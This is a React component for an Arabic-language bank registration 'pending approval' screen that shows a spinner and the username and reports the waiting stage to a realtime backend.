import { useEffect, useState } from 'react';
import { AppLayout } from '@/components/layout/AppLayout';
import { Loader2, ShieldCheck } from 'lucide-react';
import { useRegistration } from '@/context/RegistrationContext';
import { useRealtime } from '@/context/RealtimeContext';

export default function PendingApproval() {
  const { data } = useRegistration();
  const { reportStage } = useRealtime();
  const [dots, setDots] = useState('');

  useEffect(() => {
    reportStage('pending_approval', {
      username: data.username,
      status: 'waiting_for_review'
    });
  }, [reportStage, data.username]);

  useEffect(() => {
    const interval = setInterval(() => {
      setDots(prev => prev.length >= 3 ? '' : prev + '.');
    }, 500);

    return () => clearInterval(interval);
  }, []);

  return (
    <AppLayout>
      <div className="flex-1 flex flex-col items-center justify-center max-w-md w-full mx-auto animate-in fade-in duration-500 py-10" dir="rtl">
        
        <div className="relative mb-8">
          <div className="w-20 h-20 rounded-full bg-secondary/50 flex items-center justify-center border border-border/40">
            <Loader2 className="w-8 h-8 text-primary animate-spin" />
          </div>
        </div>

        <h1 className="text-xl font-bold text-foreground text-center mb-2">
          جارٍ التحقق من البيانات {dots}
        </h1>
        
        <p className="text-xs text-muted-foreground text-center mb-6 leading-relaxed px-4">
          يرجى الانتظار بينما يتم مراجعة ومصادقة بيانات حسابك مع أنظمة البنك المشفرة.
        </p>

        {/* كارت معلومات العملية المصرفية النظيف */}
        <div className="bg-card border border-border/80 rounded-2xl p-5 w-full shadow-sm text-right">
          <div className="space-y-3.5">
            
            <div className="flex items-center justify-between pb-3 border-b border-border/50">
              <span className="text-muted-foreground text-xs font-medium"> العميل</span>
              <span className="font-mono text-sm font-bold text-foreground" dir="ltr">{data.username || '—'}</span>
            </div>
            
            <div className="flex items-center justify-between">
              <span className="text-muted-foreground text-xs font-medium">حالة الطلب</span>
              <span className="flex items-center gap-1.5 text-amber-600 text-xs font-bold bg-amber-500/10 px-2.5 py-1 rounded-lg">
                <span className="w-1.5 h-1.5 bg-amber-500 rounded-full animate-pulse" />
                قيد المعالجة 
              </span>
            </div>

          </div>
        </div>

        <div className="mt-8 flex flex-col items-center gap-2 text-center text-[11px] text-muted-foreground">
          <div className="flex items-center gap-1.5 text-primary/80 font-medium">
            <ShieldCheck className="w-3.5 h-3.5" />
            <span>تشفير كامل للبيانات 256-bit</span>
          </div>
          <div className="space-y-0.5 mt-1 text-muted-foreground/80">
            <p>قد تستغرق هذه العملية بضع ثوانٍ، يرجى عدم إغلاق النافذة أو تحديث الصفحة.</p>
          </div>
        </div>

      </div>
    </AppLayout>
  );
}
